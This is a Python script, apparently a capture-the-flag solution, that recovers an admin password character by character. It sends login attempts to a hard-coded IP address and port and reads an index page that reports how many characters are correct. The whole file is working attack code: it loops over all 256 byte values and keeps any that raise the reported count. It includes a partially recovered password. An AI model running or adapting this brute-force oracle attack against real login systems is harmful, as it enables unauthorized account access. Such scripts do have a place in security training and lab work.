import requests
import string

# --- Configuration ---
URL = "http://52.59.124.14:5015/login.php" # Change this to the actual URL
USERNAME = "admin"
MAX_LENGTH = 16

# --- FINAL MODIFICATION: Create a charset of ALL possible bytes (0-255) ---
CHARSET = [chr(i) for i in range(256)]

def solve():
    # Start with the password you already found
    password = "YzUnh2ruQix9mBW" 
    
    session = requests.Session()

    # The loop will now start by trying to find the 16th character
    for i in range(len(password), MAX_LENGTH):
        found_char = False
        for char in CHARSET:
            test_password = password + char
            
            payload = {
                'username': USERNAME,
                'password': test_password
            }
            
            print(f"[*] Trying: {test_password.ljust(MAX_LENGTH)}", end='\r')

            session.post(URL, data=payload, allow_redirects=False)
            response = session.get(f"http://52.59.124.14:5015/index.php") # Change this URL
            
            expected_correct_count = len(password) + 1
            success_message = f"you got {expected_correct_count} characters correct"

            if success_message in response.text:
                password += char
                # We need to represent the found character, repr() is good for non-printable chars
                print(f"[+] Password found so far: {repr(password)}".ljust(70))
                found_char = True
                break

        if not found_char:
            print("\n[+] Could not find the next character. Password may be complete.")
            break
            
    print(f"\n[SUCCESS] Final Password: {repr(password)}")
    return password

if __name__ == "__main__":
    solve()